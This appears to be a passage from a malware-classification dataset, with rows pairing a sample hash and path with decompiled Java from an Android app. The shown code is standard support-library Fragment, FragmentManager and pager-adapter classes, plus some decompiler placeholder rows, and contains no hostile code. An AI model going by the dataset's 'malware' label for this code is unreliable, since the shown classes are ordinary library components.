this.mChildFragmentManager;   }   public final Fragment getParentFragment(){     return this.mParentFragment;   }   public final boolean isAdded(){     return this.mActivity != null && this.mAdded;   }   public final boolean isDetached(){     return this.mDetached;   }   public final boolean isRemoving(){     return this.mRemoving;   }   public final boolean isInLayout(){     return this.mInLayout;   }   public final boolean isResumed(){     return this.mResumed;   }   public final boolean isVisible(){     return (!isAdded() || isHidden() || this.mView == null || this.mView.getWindowToken() == null || this.mView.getVisibility() != 0) ? false : true;   }   public final boolean isHidden(){     return this.mHidden;   }   public final boolean hasOptionsMenu(){     return this.mHasMenu;   }   public final boolean isMenuVisible(){     return this.mMenuVisible;   }   public void onHiddenChanged(  boolean hidden){   }   public void setRetainInstance(  boolean retain){     if (retain && this.mParentFragment != null) {       throw new IllegalStateException(""Can't retain fragements that are nested in other fragments"");     }     this.mRetainInstance=retain;   }   public final boolean getRetainInstance(){     return this.mRetainInstance;   }   public void setHasOptionsMenu(  boolean hasMenu){     if (this.mHasMenu != hasMenu) {       this.mHasMenu=hasMenu;       if (isAdded() && !isHidden()) {         this.mActivity.supportInvalidateOptionsMenu();       }     }   }   public void setMenuVisibility(  boolean menuVisible){     if (this.mMenuVisible != menuVisible) {       this.mMenuVisible=menuVisible;       if (this.mHasMenu && isAdded() && !isHidden()) {         this.mActivity.supportInvalidateOptionsMenu();       }     }   }   public void setUserVisibleHint(  boolean isVisibleToUser){     if (!this.mUserVisibleHint && isVisibleToUser && this.mState < 4) {       this.mFragmentManager.performPendingDeferredStart(this);     }     this.mUserVisibleHint=isVisibleToUser;     this.mDeferStart=!isVisibleToUser;   }   public boolean getUserVisibleHint(){     return this.mUserVisibleHint;   }   public LoaderManager getLoaderManager(){     if (this.mLoaderManager != null) {       return this.mLoaderManager;     }     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     this.mCheckedForLoaderManager=true;     this.mLoaderManager=this.mActivity.getLoaderManager(this.mWho,this.mLoadersStarted,true);     return this.mLoaderManager;   }   public void startActivity(  Intent intent){     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     this.mActivity.startActivityFromFragment(this,intent,-1);   }   public void startActivityForResult(  Intent intent,  int requestCode){     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     this.mActivity.startActivityFromFragment(this,intent,requestCode);   }   public void onActivityResult(  int requestCode,  int resultCode,  Intent data){   }   public LayoutInflater getLayoutInflater(  Bundle savedInstanceState){     return this.mActivity.getLayoutInflater();   }   public void onInflate(  Activity activity,  AttributeSet attrs,  Bundle savedInstanceState){     this.mCalled=true;   }   public void onAttach(  Activity activity){     this.mCalled=true;   }   public Animation onCreateAnimation(  int transit,  boolean enter,  int nextAnim){     return null;   }   public void onCreate(  Bundle savedInstanceState){     this.mCalled=true;   }   public View onCreateView(  LayoutInflater inflater,  ViewGroup container,  Bundle savedInstanceState){     return null;   }   public void onViewCreated(  View view,  Bundle savedInstanceState){   }   public View getView(){     return this.mView;   }   public void onActivityCreated(  Bundle savedInstanceState){     this.mCalled=true;   }   public void onViewStateRestored(  Bundle savedInstanceState){     this.mCalled=true;   }   public void onStart(){     this.mCalled=true;     if (!this.mLoadersStarted) {       this.mLoadersStarted=true;       if (!this.mCheckedForLoaderManager) {         this.mCheckedForLoaderManager=true;         this.mLoaderManager=this.mActivity.getLoaderManager(this.mWho,this.mLoadersStarted,false);       }       if (this.mLoaderManager != null) {         this.mLoaderManager.doStart();       }     }   }   public void onResume(){     this.mCalled=true;   }   public void onSaveInstanceState(  Bundle outState){   }   @Override public void onConfigurationChanged(  Configuration newConfig){     this.mCalled=true;   }   public void onPause(){     this.mCalled=true;   }   public void onStop(){     this.mCalled=true;   }   @Override public void onLowMemory(){     this.mCalled=true;   }   public void onDestroyView(){     this.mCalled=true;   }   public void onDestroy(){     this.mCalled=true;     if (!this.mCheckedForLoaderManager) {       this.mCheckedForLoaderManager=true;       this.mLoaderManager=this.mActivity.getLoaderManager(this.mWho,this.mLoadersStarted,false);     }     if (this.mLoaderManager != null) {       this.mLoaderManager.doDestroy();     }   }   public void initState(){     this.mIndex=-1;     this.mWho=null;     this.mAdded=false;     this.mRemoving=false;     this.mResumed=false;     this.mFromLayout=false;     this.mInLayout=false;     this.mRestored=false;     this.mBackStackNesting=0;     this.mFragmentManager=null;     this.mActivity=null;     this.mFragmentId=0;     this.mContainerId=0;     this.mTag=null;     this.mHidden=false;     this.mDetached=false;     this.mRetaining=false;     this.mLoaderManager=null;     this.mLoadersStarted=false;     this.mCheckedForLoaderManager=false;   }   public void onDetach(){     this.mCalled=true;   }   public void onCreateOptionsMenu(  Menu menu,  MenuInflater inflater){   }   public void onPrepareOptionsMenu(  Menu menu){   }   public void onDestroyOptionsMenu(){   }   public boolean onOptionsItemSelected(  MenuItem item){     return false;   }   public void onOptionsMenuClosed(  Menu menu){   }   @Override public void onCreateContextMenu(  ContextMenu menu,  View v,  ContextMenu.ContextMenuInfo menuInfo){     getActivity().onCreateContextMenu(menu,v,menuInfo);   }   public void registerForContextMenu(  View view){     view.setOnCreateContextMenuListener(this);   }   public void unregisterForContextMenu(  View view){     view.setOnCreateContextMenuListener(null);   }   public boolean onContextItemSelected(  MenuItem item){     return false;   }   public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     writer.print(prefix);     writer.print(""mFragmentId=#"");     writer.print(Integer.toHexString(this.mFragmentId));     writer.print("" mContainerId=#"");     writer.print(Integer.toHexString(this.mContainerId));     writer.print("" mTag="");     writer.println(this.mTag);     writer.print(prefix);     writer.print(""mState="");     writer.print(this.mState);     writer.print("" mIndex="");     writer.print(this.mIndex);     writer.print("" mWho="");     writer.print(this.mWho);     writer.print("" mBackStackNesting="");     writer.println(this.mBackStackNesting);     writer.print(prefix);     writer.print(""mAdded="");     writer.print(this.mAdded);     writer.print("" mRemoving="");     writer.print(this.mRemoving);     writer.print("" mResumed="");     writer.print(this.mResumed);     writer.print("" mFromLayout="");     writer.print(this.mFromLayout);     writer.print("" mInLayout="");     writer.println(this.mInLayout);     writer.print(prefix);     writer.print(""mHidden="");     writer.print(this.mHidden);     writer.print("" mDetached="");     writer.print(this.mDetached);     writer.print("" mMenuVisible="");     writer.print(this.mMenuVisible);     writer.print("" mHasMenu="");     writer.println(this.mHasMenu);     writer.print(prefix);     writer.print(""mRetainInstance="");     writer.print(this.mRetainInstance);     writer.print("" mRetaining="");     writer.print(this.mRetaining);     writer.print("" mUserVisibleHint="");     writer.println(this.mUserVisibleHint);     if (this.mFragmentManager != null) {       writer.print(prefix);       writer.print(""mFragmentManager="");       writer.println(this.mFragmentManager);     }     if (this.mActivity != null) {       writer.print(prefix);       writer.print(""mActivity="");       writer.println(this.mActivity);     }     if (this.mParentFragment != null) {       writer.print(prefix);       writer.print(""mParentFragment="");       writer.println(this.mParentFragment);     }     if (this.mArguments != null) {       writer.print(prefix);       writer.print(""mArguments="");       writer.println(this.mArguments);     }     if (this.mSavedFragmentState != null) {       writer.print(prefix);       writer.print(""mSavedFragmentState="");       writer.println(this.mSavedFragmentState);     }     if (this.mSavedViewState != null) {       writer.print(prefix);       writer.print(""mSavedViewState="");       writer.println(this.mSavedViewState);     }     if (this.mTarget != null) {       writer.print(prefix);       writer.print(""mTarget="");       writer.print(this.mTarget);       writer.print("" mTargetRequestCode="");       writer.println(this.mTargetRequestCode);     }     if (this.mNextAnim != 0) {       writer.print(prefix);       writer.print(""mNextAnim="");       writer.println(this.mNextAnim);     }     if (this.mContainer != null) {       writer.print(prefix);       writer.print(""mContainer="");       writer.println(this.mContainer);     }     if (this.mView != null) {       writer.print(prefix);       writer.print(""mView="");       writer.println(this.mView);     }     if (this.mInnerView != null) {       writer.print(prefix);       writer.print(""mInnerView="");       writer.println(this.mView);     }     if (this.mAnimatingAway != null) {       writer.print(prefix);       writer.print(""mAnimatingAway="");       writer.println(this.mAnimatingAway);       writer.print(prefix);       writer.print(""mStateAfterAnimating="");       writer.println(this.mStateAfterAnimating);     }     if (this.mLoaderManager != null) {       writer.print(prefix);       writer.println(""Loader Manager:"");       this.mLoaderManager.dump(prefix + ""  "",fd,writer,args);     }     if (this.mChildFragmentManager != null) {       writer.print(prefix);       writer.println(""Child "" + this.mChildFragmentManager + "":"");       this.mChildFragmentManager.dump(prefix + ""  "",fd,writer,args);     }   }   public Fragment findFragmentByWho(  String who){     if (!who.equals(this.mWho)) {       if (this.mChildFragmentManager != null) {         return this.mChildFragmentManager.findFragmentByWho(who);       }       return null;     }     return this;   }   void instantiateChildFragmentManager(){     this.mChildFragmentManager=new FragmentManagerImpl();     this.mChildFragmentManager.attachActivity(this.mActivity,new FragmentContainer(){       @Override public View findViewById(      int id){         if (Fragment.this.mView == null) {           throw new IllegalStateException(""Fragment does not have a view"");         }         return Fragment.this.mView.findViewById(id);       }     } ,this);   }   public void performCreate(  Bundle savedInstanceState){     Parcelable p;     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();     }     this.mCalled=false;     onCreate(savedInstanceState);     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onCreate()"");     }     if (savedInstanceState != null && (p=savedInstanceState.getParcelable(""android:support:fragments"")) != null) {       if (this.mChildFragmentManager == null) {         instantiateChildFragmentManager();       }       this.mChildFragmentManager.restoreAllState(p,null);       this.mChildFragmentManager.dispatchCreate();     }   }   public View performCreateView(  LayoutInflater inflater,  ViewGroup container,  Bundle savedInstanceState){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();     }     return onCreateView(inflater,container,savedInstanceState);   }   public void performActivityCreated(  Bundle savedInstanceState){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();     }     this.mCalled=false;     onActivityCreated(savedInstanceState);     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onActivityCreated()"");     }     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchActivityCreated();     }   }   public void performStart(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();       this.mChildFragmentManager.execPendingActions();     }     this.mCalled=false;     onStart();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onStart()"");     }     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchStart();     }     if (this.mLoaderManager != null) {       this.mLoaderManager.doReportStart();     }   }   public void performResume(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();       this.mChildFragmentManager.execPendingActions();     }     this.mCalled=false;     onResume();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onResume()"");     }     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchResume();       this.mChildFragmentManager.execPendingActions();     }   }   public void performConfigurationChanged(  Configuration newConfig){     onConfigurationChanged(newConfig);     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchConfigurationChanged(newConfig);     }   }   public void performLowMemory(){     onLowMemory();     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchLowMemory();     }   }   public boolean performCreateOptionsMenu(  Menu menu,  MenuInflater inflater){     boolean show=false;     if (this.mHidden) {       return false;     }     if (this.mHasMenu && this.mMenuVisible) {       show=true;       onCreateOptionsMenu(menu,inflater);     }     if (this.mChildFragmentManager != null) {       return show | this.mChildFragmentManager.dispatchCreateOptionsMenu(menu,inflater);     }     return show;   }   public boolean performPrepareOptionsMenu(  Menu menu){     boolean show=false;     if (this.mHidden) {       return false;     }     if (this.mHasMenu && this.mMenuVisible) {       show=true;       onPrepareOptionsMenu(menu);     }     if (this.mChildFragmentManager != null) {       return show | this.mChildFragmentManager.dispatchPrepareOptionsMenu(menu);     }     return show;   }   public boolean performOptionsItemSelected(  MenuItem item){     if (!this.mHidden) {       if (this.mHasMenu && this.mMenuVisible && onOptionsItemSelected(item)) {         return true;       }       if (this.mChildFragmentManager != null && this.mChildFragmentManager.dispatchOptionsItemSelected(item)) {         return true;       }     }     return false;   }   public boolean performContextItemSelected(  MenuItem item){     if (!this.mHidden) {       if (onContextItemSelected(item)) {         return true;       }       if (this.mChildFragmentManager != null && this.mChildFragmentManager.dispatchContextItemSelected(item)) {         return true;       }     }     return false;   }   public void performOptionsMenuClosed(  Menu menu){     if (!this.mHidden) {       if (this.mHasMenu && this.mMenuVisible) {         onOptionsMenuClosed(menu);       }       if (this.mChildFragmentManager != null) {         this.mChildFragmentManager.dispatchOptionsMenuClosed(menu);       }     }   }   public void performSaveInstanceState(  Bundle outState){     Parcelable p;     onSaveInstanceState(outState);     if (this.mChildFragmentManager != null && (p=this.mChildFragmentManager.saveAllState()) != null) {       outState.putParcelable(""android:support:fragments"",p);     }   }   public void performPause(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchPause();     }     this.mCalled=false;     onPause();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onPause()"");     }   }   public void performStop(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchStop();     }     this.mCalled=false;     onStop();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onStop()"");     }   }   public void performReallyStop(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchReallyStop();     }     if (this.mLoadersStarted) {       this.mLoadersStarted=false;       if (!this.mCheckedForLoaderManager) {         this.mCheckedForLoaderManager=true;         this.mLoaderManager=this.mActivity.getLoaderManager(this.mWho,this.mLoadersStarted,false);       }       if (this.mLoaderManager != null) {         if (!this.mActivity.mRetaining) {           this.mLoaderManager.doStop();         }  else {           this.mLoaderManager.doRetain();         }       }     }   }   public void performDestroyView(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchDestroyView();     }     this.mCalled=false;     onDestroyView();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onDestroyView()"");     }     if (this.mLoaderManager != null) {       this.mLoaderManager.doReportNextStart();     }   }   public void performDestroy(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchDestroy();     }     this.mCalled=false;     onDestroy();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onDestroy()"");     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\FragmentActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2095e085"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\FragmentContainer.code","interface FragmentContainer {   View findViewById(  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\FragmentManager.code","public abstract class FragmentManager {   public static final int POP_BACK_STACK_INCLUSIVE=1; public interface BackStackEntry {     CharSequence getBreadCrumbShortTitle();     int getBreadCrumbShortTitleRes();     CharSequence getBreadCrumbTitle();     int getBreadCrumbTitleRes();     int getId();     String getName();   } public interface OnBackStackChangedListener {     void onBackStackChanged();   }   public abstract void addOnBackStackChangedListener(  OnBackStackChangedListener onBackStackChangedListener);   public abstract FragmentTransaction beginTransaction();   public abstract void dump(  String str,  FileDescriptor fileDescriptor,  PrintWriter printWriter,  String[] strArr);   public abstract boolean executePendingTransactions();   public abstract Fragment findFragmentById(  int i);   public abstract Fragment findFragmentByTag(  String str);   public abstract BackStackEntry getBackStackEntryAt(  int i);   public abstract int getBackStackEntryCount();   public abstract Fragment getFragment(  Bundle bundle,  String str);   public abstract List<Fragment> getFragments();   public abstract void popBackStack();   public abstract void popBackStack(  int i,  int i2);   public abstract void popBackStack(  String str,  int i);   public abstract boolean popBackStackImmediate();   public abstract boolean popBackStackImmediate(  int i,  int i2);   public abstract boolean popBackStackImmediate(  String str,  int i);   public abstract void putFragment(  Bundle bundle,  String str,  Fragment fragment);   public abstract void removeOnBackStackChangedListener(  OnBackStackChangedListener onBackStackChangedListener);   public abstract Fragment.SavedState saveFragmentInstanceState(  Fragment fragment);   @Deprecated public FragmentTransaction openTransaction(){     return beginTransaction();   }   public static void enableDebugLogging(  boolean enabled){     FragmentManagerImpl.DEBUG=enabled;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\FragmentManagerImpl.code","!org.eclipse.jdt.core.dom.TypeDeclaration@e888636"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\FragmentManagerState.code","public final class FragmentManagerState implements Parcelable {   public static final Parcelable.Creator<FragmentManagerState> CREATOR=new Parcelable.Creator<FragmentManagerState>(){     @Override public FragmentManagerState createFromParcel(    Parcel in){       return new FragmentManagerState(in);     }     @Override public FragmentManagerState[] newArray(    int size){       return new FragmentManagerState[size];     }   } ;   FragmentState[] mActive;   int[] mAdded;   BackStackState[] mBackStack;   public FragmentManagerState(){   }   public FragmentManagerState(  Parcel in){     this.mActive=(FragmentState[])in.createTypedArray(FragmentState.CREATOR);     this.mAdded=in.createIntArray();     this.mBackStack=(BackStackState[])in.createTypedArray(BackStackState.CREATOR);   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeTypedArray(this.mActive,flags);     dest.writeIntArray(this.mAdded);     dest.writeTypedArray(this.mBackStack,flags);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\FragmentPagerAdapter.code","public abstract class FragmentPagerAdapter extends PagerAdapter {   private static final boolean DEBUG=false;   private static final String TAG=""FragmentPagerAdapter"";   private FragmentTransaction mCurTransaction=null;   private Fragment mCurrentPrimaryItem=null;   private final FragmentManager mFragmentManager;   public abstract Fragment getItem(  int i);   public FragmentPagerAdapter(  FragmentManager fm){     this.mFragmentManager=fm;   }   @Override public void startUpdate(  ViewGroup container){   }   @Override public Object instantiateItem(  ViewGroup container,  int position){     if (this.mCurTransaction == null) {       this.mCurTransaction=this.mFragmentManager.beginTransaction();     }     long itemId=getItemId(position);     String name=makeFragmentName(container.getId(),itemId);     Fragment fragment=this.mFragmentManager.findFragmentByTag(name);     if (fragment != null) {       this.mCurTransaction.attach(fragment);     }  else {       fragment=getItem(position);       this.mCurTransaction.add(container.getId(),fragment,makeFragmentName(container.getId(),itemId));     }     if (fragment != this.mCurrentPrimaryItem) {       fragment.setMenuVisibility(DEBUG);       fragment.setUserVisibleHint(DEBUG);     }     return fragment;   }   @Override public void destroyItem(  ViewGroup container,  int position,  Object object){     if (this.mCurTransaction == null) {       this.mCurTransaction=this.mFragmentManager.beginTransaction();     }     this.mCurTransaction.detach((Fragment)object);   }   @Override public void setPrimaryItem(  ViewGroup container,  int position,  Object object){     Fragment fragment=(Fragment)object;     if (fragment != this.mCurrentPrimaryItem) {       if (this.mCurrentPrimaryItem != null) {         this.mCurrentPrimaryItem.setMenuVisibility(DEBUG);         this.mCurrentPrimaryItem.setUserVisibleHint(DEBUG);       }       if (fragment != null) {         fragment.setMenuVisibility(true);         fragment.setUserVisibleHint(true);       }       this.mCurrentPrimaryItem=fragment;     }   }   @Override public void finishUpdate(  ViewGroup container){     if (this.mCurTransaction != null) {       this.mCurTransaction.commitAllowingStateLoss();       this.mCurTransaction=null;       this.mFragmentManager.executePendingTransactions();     }   }   @Override public boolean isViewFromObject(  View view,  Object object){     if (((Fragment)object).getView() == view) {       return true;     }     return DEBUG;   }   @Override public Parcelable saveState(){     return null;   }   @Override public void restoreState(  Parcelable state,  ClassLoader loader){   }   public long getItemId(  int position){     return position;   }   private static String makeFragmentName(  int viewId,  long id){     return ""android:switcher:"" + viewId + "":""+ id;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\FragmentState.code","public final class FragmentState implements Parcelable {   public static final Parcelable.Creator<FragmentState> CREATOR=new Parcelable.Creator<FragmentState>(){     @Override public FragmentState createFromParcel(    Parcel in){       return new FragmentState(in);     }     @Override public FragmentState[] newArray(    int size){       return new FragmentState[size];     }   } ;   final Bundle mArguments;   final String mClassName;   final int mContainerId;   final boolean mDetached;   final int mFragmentId;   final boolean mFromLayout;   final int mIndex;   Fragment mInstance;   final boolean mRetainInstance;   Bundle mSavedFragmentState;   final String mTag;   public FragmentState(  Fragment frag){     this.mClassName=frag.getClass().getName();     this.mIndex=frag.mIndex;     this.mFromLayout=frag.mFromLayout;     this.mFragmentId=frag.mFragmentId;     this.mContainerId=frag.mContainerId;     this.mTag=frag.mTag;     this.mRetainInstance=frag.mRetainInstance;     this.mDetached=frag.mDetached;     this.mArguments=frag.mArguments;   }   public FragmentState(  Parcel in){     this.mClassName=in.readString();     this.mIndex=in.readInt();     this.mFromLayout=in.readInt() != 0;     this.mFragmentId=in.readInt();     this.mContainerId=in.readInt();     this.mTag=in.readString();     this.mRetainInstance=in.readInt() != 0;     this.mDetached=in.readInt() != 0;     this.mArguments=in.readBundle();     this.mSavedFragmentState=in.readBundle();   }   public Fragment instantiate(  FragmentActivity activity,  Fragment parent){     if (this.mInstance != null) {       return this.mInstance;     }     if (this.mArguments != null) {       this.mArguments.setClassLoader(activity.getClassLoader());     }     this.mInstance=Fragment.instantiate(activity,this.mClassName,this.mArguments);     if (this.mSavedFragmentState != null) {       this.mSavedFragmentState.setClassLoader(activity.getClassLoader());       this.mInstance.mSavedFragmentState=this.mSavedFragmentState;     }     this.mInstance.setIndex(this.mIndex,parent);     this.mInstance.mFromLayout=this.mFromLayout;     this.mInstance.mRestored=true;     this.mInstance.mFragmentId=this.mFragmentId;     this.mInstance.mContainerId=this.mContainerId;     this.mInstance.mTag=this.mTag;     this.mInstance.mRetainInstance=this.mRetainInstance;     this.mInstance.mDetached=this.mDetached;     this.mInstance.mFragmentManager=activity.mFragments;     if (FragmentManagerImpl.DEBUG) {       Log.v(""FragmentManager"",""Instantiated fragment "" + this.mInstance);     }     return this.mInstance;   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeString(this.mClassName);     dest.writeInt(this.mIndex);     dest.writeInt(this.mFromLayout ? 1 : 0);     dest.writeInt(this.mFragmentId);     dest.writeInt(this.mContainerId);     dest.writeString(this.mTag);     dest.writeInt(this.mRetainInstance ? 1 : 0);     dest.writeInt(this.mDetached ? 1 : 0);     dest.writeBundle(this.mArguments);     dest.writeBundle(this.mSavedFragmentState);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\FragmentStatePagerAdapter.code","public abstract class FragmentStatePagerAdapter extends PagerAdapter {   private static final boolean DEBUG=false;   private static final String TAG=""FragmentStatePagerAdapter"";   private final FragmentManager mFragmentManager;   private FragmentTransaction mCurTransaction=null;   private ArrayList<Fragment.SavedState> mSavedState=new ArrayList<>();   private ArrayList<Fragment> mFragments=new ArrayList<>();   private Fragment mCurrentPrimaryItem=null;   public abstract Fragment getItem(  int i);   public FragmentStatePagerAdapter(  FragmentManager fm){     this.mFragmentManager=fm;   }   @Override public void startUpdate(  ViewGroup container){   }   @Override public Object instantiateItem(  ViewGroup container,  int position){     Fragment.SavedState fss;     Fragment f;     if (this.mFragments.size() <= position || (f=this.mFragments.get(position)) == null) {       if (this.mCurTransaction == null) {         this.mCurTransaction=this.mFragmentManager.beginTransaction();       }       Fragment fragment=getItem(position);       if (this.mSavedState.size() > position && (fss=this.mSavedState.get(position)) != null) {         fragment.setInitialSavedState(fss);       }       while (this.mFragments.size() <= position) {         this.mFragments.add(null);       }       fragment.setMenuVisibility(DEBUG);       fragment.setUserVisibleHint(DEBUG);       this.mFragments.set(position,fragment);       this.mCurTransaction.add(container.getId(),fragment);       return fragment;     }     return f;   }   @Override public void destroyItem(  ViewGroup container,  int position,  Object object){     Fragment fragment=(Fragment)object;     if (this.mCurTransaction == null) {       this.mCurTransaction=this.mFragmentManager.beginTransaction();     }     while (this.mSavedState.size() <= position) {       this.mSavedState.add(null);     }     this.mSavedState.set(position,this.mFragmentManager.saveFragmentInstanceState(fragment));     this.mFragments.set(position,null);     this.mCurTransaction.remove(fragment);   }   @Override public void setPrimaryItem(  ViewGroup container,  int position,  Object object){     Fragment fragment=(Fragment)object;     if (fragment != this.mCurrentPrimaryItem) {       if (this.mCurrentPrimaryItem != null) {         this.mCurrentPrimaryItem.setMenuVisibility(DEBUG);         this.mCurrentPrimaryItem.setUserVisibleHint(DEBUG);       }       if (fragment != null) {         fragment.setMenuVisibility(true);         fragment.setUserVisibleHint(true);       }       this.mCurrentPrimaryItem=fragment;     }   }   @Override public void finishUpdate(  ViewGroup container){     if (this.mCurTransaction != null) {       this.mCurTransaction.commitAllowingStateLoss();       this.mCurTransaction=null;       this.mFragmentManager.executePendingTransactions();     }   }   @Override public boolean isViewFromObject(  View view,  Object object){     if (((Fragment)object).getView() == view) {       return true;     }     return DEBUG;   }   @Override public Parcelable saveState(){     Bundle state=null;     if (this.mSavedState.size() > 0) {       state=new Bundle();       Fragment.SavedState[] fss=new Fragment.SavedState[this.mSavedState.size()];       this.mSavedState.toArray(fss);       state.putParcelableArray(""states"",fss);     }     for (int i=0; i < this.mFragments.size(); i++) {       Fragment f=this.mFragments.get(i);       if (f != null) {         if (state == null) {           state=new Bundle();         }         String key=""f"" + i;         this.mFragmentManager.putFragment(state,key,f);       }     }     return state;   }   @Override public void restoreState(  Parcelable state,  ClassLoader loader){     if (state != null) {       Bundle bundle=(Bundle)state;       bundle.setClassLoader(loader);       Parcelable[] fss=bundle.getParcelableArray(""states"");       this.mSavedState.clear();       this.mFragments.clear();       if (fss != null) {         for (        Parcelable parcelable : fss) {           this.mSavedState.add((Fragment.SavedState)parcelable);         }       }       Iterable<String> keys=bundle.keySet();       for (      String key : keys) {         if (key.startsWith(""f"")) {           int index=Integer.parseInt(key.substring(1));           Fragment f=this.mFragmentManager.getFragment(bundle,key);           if (f != null) {             while (this.mFragments.size() <= index) {               this.mFragments.add(null);             }             f.setMenuVisibility(DEBUG);             this.mFragments.set(index,f);           }  else {             Log.w(TAG,""Bad fragment at key "" + key);           }         }       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\FragmentTabHost.code","public class FragmentTabHost extends TabHost implements TabHost.OnTabChangeListener {   private boolean mAttached;   private int mContainerId;   private Context mContext;   private FragmentManager mFragmentManager;   private TabInfo mLastTab;   private TabHost.OnTabChangeListener mOnTabChangeListener;   private FrameLayout mRealTabContent;   private final ArrayList<TabInfo> mTabs; public static final class TabInfo {     private final Bundle args;     private final Class<?> clss;     private Fragment fragment;     private final String tag;     TabInfo(    String _tag,    Class<?> _class,    Bundle _args){       this.tag=_tag;       this.clss=_class;       this.args=_args;     }   } static class DummyTabFactory implements TabHost.TabContentFactory {     private final Context mContext;     public DummyTabFactory(    Context context){       this.mContext=context;     }     @Override public View createTabContent(    String tag){       View v=new View(this.mContext);       v.setMinimumWidth(0);       v.setMinimumHeight(0);       return v;     }   } public static class SavedState extends View.BaseSavedState {     public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){       @Override public SavedState createFromParcel(      Parcel in){         return new SavedState(in);       }       @Override public SavedState[] newArray(      int size){         return new SavedState[size];       }     } ;     String curTab;     SavedState(    Parcelable superState){       super(superState);     }     private SavedState(    Parcel in){       super(in);       this.curTab=in.readString();     }     @Override public void writeToParcel(    Parcel out,    int flags){       super.writeToParcel(out,flags);       out.writeString(this.curTab);     }     public String toString(){       return ""FragmentTabHost.SavedState{"" + Integer.toHexString(System.identityHashCode(this)) + "" curTab=""+ this.curTab+ ""}"";     }   }   public FragmentTabHost(  Context context){     super(context,null);     this.mTabs=new ArrayList<>();     initFragmentTabHost(context,null);   }   public FragmentTabHost(  Context context,  AttributeSet attrs){     super(context,attrs);     this.mTabs=new ArrayList<>();     initFragmentTabHost(context,attrs);   }   private void initFragmentTabHost(  Context context,  AttributeSet attrs){     TypedArray a2=context.obtainStyledAttributes(attrs,new int[]{R.attr.inflatedId},0,0);     this.mContainerId=a2.getResourceId(0,0);     a2.recycle();     super.setOnTabChangedListener(this);   }   private void ensureHierarchy(  Context context){     if (findViewById(R.id.tabs) == null) {       LinearLayout ll=new LinearLayout(context);       ll.setOrientation(1);       addView(ll,new FrameLayout.LayoutParams(-1,-1));       TabWidget tw=new TabWidget(context);       tw.setId(R.id.tabs);       tw.setOrientation(0);       ll.addView(tw,new LinearLayout.LayoutParams(-1,-2,0.0f));       FrameLayout fl=new FrameLayout(context);       fl.setId(R.id.tabcontent);       ll.addView(fl,new LinearLayout.LayoutParams(0,0,0.0f));       FrameLayout fl2=new FrameLayout(context);       this.mRealTabContent=fl2;       this.mRealTabContent.setId(this.mContainerId);       ll.addView(fl2,new LinearLayout.LayoutParams(-1,0,1.0f));     }   }   @Override @Deprecated public void setup(){     throw new IllegalStateException(""Must call setup() that takes a Context and FragmentManager"");   }   public void setup(  Context context,  FragmentManager manager){     ensureHierarchy(context);     super.setup();     this.mContext=context;     this.mFragmentManager=manager;     ensureContent();   }   public void setup(  Context context,  FragmentManager manager,  int containerId){     ensureHierarchy(context);     super.setup();     this.mContext=context;     